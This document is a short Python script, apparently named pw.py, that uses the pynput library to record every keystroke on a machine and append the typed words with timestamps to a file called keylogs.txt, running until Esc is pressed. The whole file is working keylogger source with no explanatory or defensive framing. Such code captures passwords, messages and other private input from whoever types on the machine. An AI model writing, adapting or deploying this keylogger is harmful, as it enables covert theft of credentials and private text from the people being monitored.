#!python3
#pw.py
from pynput.keyboard import Key,Listener
import logging
import datetime 

log_dir = ''
keys = []
count = 0

#Todo after key is presses
def onPress(key):
    global keys
    
    if (str(key).find("space") > 0) or (str(key).find("enter") > 0): 
        writeInToFile(keys)
        keys = []
    else:
        if str(key).find("Key") == -1:
            keys.append(key)    
    # logging.info(str(key))
    
def writeInToFile(keys):
    try:
        b = ''
        with open("keylogs.txt",'a') as file:
            if keys:
                for key in keys:
                    print(key)
                    key = str(key).replace("'",'')
                    key = b + key
                    b = key
                content = key    
                firstLine = str(datetime.datetime.now().strftime('%H:%M %p:%d-%m-%Y'))+ " "+ content +" "+"\n"    
                file.write(firstLine)
    except:
        pass
            
          
def onRelease(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=onPress,on_release=onRelease) as listener:
    listener.join()
    
